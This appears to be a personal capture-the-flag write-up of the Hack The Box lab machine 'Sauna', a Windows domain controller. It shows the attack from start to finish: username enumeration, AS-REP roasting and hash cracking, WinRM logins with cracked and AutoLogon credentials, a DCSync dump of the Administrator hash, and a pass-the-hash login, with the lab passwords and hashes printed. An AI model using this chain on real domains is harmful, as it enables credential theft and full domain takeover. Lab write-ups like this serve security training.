
### Initial access
Port scan
```bash
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Egotistical Bank :: Home
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-09-22 17:01:01Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49677/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49678/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49679/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49692/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49701/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-09-22T17:01:53
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 38495/tcp): CLEAN (Timeout)
|   Check 2 (port 31616/tcp): CLEAN (Timeout)
|   Check 3 (port 10224/udp): CLEAN (Timeout)
|   Check 4 (port 57652/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: 6h58m31s


```
subdomain scan
dirscan
filescan

We have username in website in `about.html`
Users.txt
```
fsmith
fergus.smith
fergussmith
smithf
scoins
shaun.coins
shauncoins
coinss
hbear
hugo.bear
hugobear
bearh
btaylor
bowie.taylor
bowietaylor
taylorb
sdriver
sophie.driver
sophiedriver
drivers
skerbro
steven.kerbro
stevenkerbro
kerbros
hsmith
hugo.smith
hugosmith

```
We aesproasting
```
┌──(kali㉿kali)-[~/HTB/Sauna]
└─$ impacket-GetNPUsers -dc-ip 10.129.95.180 EGOTISTICAL-BANK.LOCAL/ -usersfile users.txt -format hashcat -outputfile hashes.txt

Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:8fad5044ca0949185e04e3a27d0f5f3f$920cffc817cf0f0835e5de8fd23fc38fa4e0a00a54750f0b785c02539b5c4a6cfb8953108743dcb4f90c1fd89c9f978d0031c15efb4b780f8a2c0835828ddd8645900c216dd6be7ca726735b287e5f4e711d4a005d3f2e4e16bf86d2be84362bbbb84e67368437ac3f82e7a45767b1f161914ea37bf8fece135492cfd660334d033763e57a467725aefde00a2dad46575a19292845304d759b68ae5e833df95c961c0f911a5ed67c8356216bdcb1bf097b9f623b2575c84ee515001d51d66b01299991b89fbdd7c6082096475930102b87d4fe3cf1e3549dc95391ac1f4ed7f4be12d5dbc7f0b335e46b91667587ae67f49281884bf67356b7d7d02b1d69ca4e
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)

```

Crack hash
```
┌──(kali㉿kali)-[~/HTB/Sauna]
└─$ sudo hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule --force  
hashcat (v7.1.2) starting

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #01: cpu-skylake-avx512-AMD Ryzen 7 8700G w/ Radeon 780M Graphics, 2901/5802 MB (1024 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 66

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory allocated for this attack: 514 MB (1835 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344388
* Bytes.....: 139921531
* Keyspace..: 946729608

$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:8fad5044ca0949185e04e3a27d0f5f3f$920cffc817cf0f0835e5de8fd23fc38fa4e0a00a54750f0b785c02539b5c4a6cfb8953108743dcb4f90c1fd89c9f978d0031c15efb4b780f8a2c0835828ddd8645900c216dd6be7ca726735b287e5f4e711d4a005d3f2e4e16bf86d2be84362bbbb84e67368437ac3f82e7a45767b1f161914ea37bf8fece135492cfd660334d033763e57a467725aefde00a2dad46575a19292845304d759b68ae5e833df95c961c0f911a5ed67c8356216bdcb1bf097b9f623b2575c84ee515001d51d66b01299991b89fbdd7c6082096475930102b87d4fe3cf1e3549dc95391ac1f4ed7f4be12d5dbc7f0b335e46b91667587ae67f49281884bf67356b7d7d02b1d69ca4e:Thestrokes23

```

We have cred `fsmith:Thestrokes23`
```
┌──(kali㉿kali)-[~/HTB/Sauna]
└─$ nxc winrm  10.129.95.180  -u  fsmith -p  'Thestrokes23' 
WINRM       10.129.95.180   5985   SAUNA            [*] Windows 10 / Server 2019 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.95.180   5985   SAUNA            [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23 (Pwn3d!)

```

```
┌──(kali㉿kali)-[~/HTB/Sauna]
└─$ evil-winrm -i  10.129.95.180  -u fsmith  -p 'Thestrokes23' 
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\FSmith\Documents> ls
*Evil-WinRM* PS C:\Users\FSmith\Documents> whoami
egotisticalbank\fsmith

```
### Lateral Movement
Run winpeas
```
ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for AutoLogon credentials (T1552.002)
    Some AutoLogon credentials were found
    DefaultDomainName             :  EGOTISTICALBANK
    DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
    DefaultPassword               :  Moneymakestheworldgoround!

```

Cuz the user name is UPN we need SAM user name to cred working
New cred `svc_loanmgr:Moneymakestheworldgoround!`

```┌──(kali㉿kali)-[~/HTB/Sauna]
└─$ nxc winrm 10.129.95.180 -u 'svc_loanmgr' -p 'Moneymakestheworldgoround!'

WINRM       10.129.95.180   5985   SAUNA            [*] Windows 10 / Server 2019 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.95.180   5985   SAUNA            [+] EGOTISTICAL-BANK.LOCAL\svc_loanmgr:Moneymakestheworldgoround! (Pwn3d!)

```
### Priv escalation
Run bloodhound we see dcsync priv let dscync attack
![[Assets/Pasted image 20260922181638.png]]

```
┌──(kali㉿kali)-[~/HTB/Sauna]
└─$ impacket-secretsdump EGOTISTICAL-BANK.LOCAL/'svc_loanmgr:Moneymakestheworldgoround!'@10.129.95.180 -just-dc-user Administrator
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e
Administrator:des-cbc-md5:fb8f321c64cea87f
[*] Cleaning up... 

```

```
                                                                                                                                                                                             
┌──(kali㉿kali)-[~/HTB/Sauna]
└─$ evil-winrm -i  10.129.95.180  -u administrator -H 823452073d75b9d1cf70ebdf86c7f98e 
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd .

```